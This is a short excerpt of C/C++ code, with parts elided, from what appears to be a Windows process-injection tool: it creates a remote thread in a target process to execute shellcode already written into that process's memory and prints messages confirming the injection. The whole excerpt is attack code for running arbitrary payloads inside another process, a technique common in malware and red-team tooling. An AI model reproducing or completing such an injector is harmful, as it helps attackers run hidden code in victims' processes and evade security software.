...
int main(int argc, char* argv[]) {
	...
	printf("[+] Wrote shellcode to allocated memory at: 0x%p\n", pAddress);

	HANDLE hThread = CreateRemoteThread(hProcess, nullptr, 0, (LPTHREAD_START_ROUTINE)pAddress, nullptr, 0, nullptr);
	if (hThread == nullptr) {
		printf("[-] Failed to create remote thread in target process: %lu\n", GetLastError());
		return EXIT_FAILURE;
	}

	printf("[+] Created remote thread in target process: 0x%p\n", hThread);

	WaitForSingleObject(hThread, INFINITE);
	CloseHandle(hThread);
	CloseHandle(hProcess);

	printf("[+] Successfully injected shellcode into process with PID %d\n", pid);
